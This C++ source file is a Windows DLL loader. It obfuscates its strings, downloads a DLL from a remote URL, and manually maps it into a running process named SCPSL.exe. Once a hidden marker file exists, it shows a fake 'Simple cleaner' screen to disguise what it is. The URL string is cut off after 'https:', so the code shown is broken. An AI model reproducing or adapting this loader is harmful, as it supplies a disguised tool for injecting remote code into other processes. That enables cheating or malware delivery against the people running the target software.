#include <Windows.h>
#include <TlHelp32.h>
#include <WinInet.h>
#include <vector>
#include <iostream>
#include <fstream>
#include <string>

#include "injector.h"
#include "secret_string.hpp"

#pragma comment(lib, "Wininet.lib")

using secret_string::operator""_secret;
using secret_string::SecretString;



int main() {
    
    constexpr auto tempFileName_secret = "TMP8r47893.dlz"_secret;
    std::string tempFileName = tempFileName_secret.read();
    std::string tempFilePath = GetTempPathFile(tempFileName);

    
    if (GetFileAttributesA(tempFilePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        std::cout << "Simple cleaner\nCleaning your pc, wait a moment..." << std::endl;
        Sleep(10000);
        std::cout << "Pc Cleaned!\n";
        system("pause");
        return 0;
    }

    
    constexpr auto url_secret = 
        "https:
    std::string url = url_secret.read();

    std::vector<char> dllData;
    if (!DownloadFileToMemory(url, dllData)) {
        std::cerr << "Error downloading DLL\n";
        return 1;
    }

    
    constexpr auto procName_secret = "SCPSL.exe"_secret;
    std::string procName = procName_secret.read();
    std::wstring wProcName(procName.begin(), procName.end());

    DWORD pid = GetProcessIdByName(wProcName.c_str());
    if (pid == 0) {
        std::cerr << "Error: process not found\n";
        return 2;
    }

    
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        std::cerr << "Error opening process: " << GetLastError() << std::endl;
        return 3;
    }

    
    if (!IsCorrectTargetArchitecture(hProc)) {
        std::cerr << "Error: architecture mismatch\n";
        CloseHandle(hProc);
        return 4;
    }

    
    if (!ManualMapDll(hProc, reinterpret_cast<BYTE*>(dllData.data()),
                      dllData.size())) {
        std::cerr << "Error injecting DLL\n";
        CloseHandle(hProc);
        return 5;
    }

    std::cout << "OK\n";
    CloseHandle(hProc);

    
    constexpr auto prompt_secret = "Type '0' to hide:"_secret;
    while (true) {
        std::cout << prompt_secret.read() << '\n';
        std::string input;
        if (!std::getline(std::cin, input) || input == "0") {
            
            std::ofstream outfile(tempFilePath);
            outfile.close();
            std::cout << "Exiting...\n";
            break;
        }
        system("cls");
    }

    return 0;
}
